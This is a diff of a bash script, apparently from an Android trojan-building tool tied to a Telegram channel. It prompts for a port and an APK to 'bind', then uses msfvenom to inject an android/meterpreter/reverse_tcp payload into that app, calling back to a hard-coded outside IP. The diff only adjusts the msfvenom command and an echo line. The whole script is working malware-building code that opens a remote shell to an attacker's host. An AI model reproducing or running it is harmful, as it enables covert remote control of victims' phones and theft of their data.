@@ -127,7 +127,7 @@ echo -e "${IWhite}// ${IGreen}JOIN FOR MORE${clear} ${IYellow}t.me/efxtv${clear}
 echo -en "${IBlue}[${clear}${IGreen}+${clear}${IBlue}]${clear} Please enter VPORT: ${IYellow}"
 read lport
 
-echo -e "${IBlue}[${clear}${IGreen}+${clear}${IBlue}]${clear} List of apps   PWD ${IYellow}"
+echo -e "${IBlue}[${clear}${IGreen}+${clear}${IBlue}]${clear} List of apps   PWD ${IYellow}\c"
 ls $PWD|grep apk|sed 's#^#\t[+] #g'
 
 echo -en "${IBlue}[${clear}${IGreen}+${clear}${IBlue}]${clear} App U want to bind: ${IYellow}"
@@ -141,7 +141,8 @@ echo -e "${IBlue}[${clear}${IGreen}+${clear}${IBlue}]${clear} Please wait... "
 sleep 3
 
 #msfvenom -x $app -p android/meterpreter/reverse_tcp LHOST=193.161.193.99 LPORT=$lport -o $op
-msfvenom -x $app -a dalvik --platform android -p android/meterpreter/reverse_tcp LHOST=193.161.193.99 LPORT=$lport R> payload.apk
+#msfvenom -x $app -a dalvik --platform android -p android/meterpreter/reverse_tcp LHOST=193.161.193.99 LPORT=$lport R> payload.apk
+msfvenom -x $app -p android/meterpreter/reverse_tcp LHOST=193.161.193.99 LPORT=$lport -o $op #2> .log
 
 
 
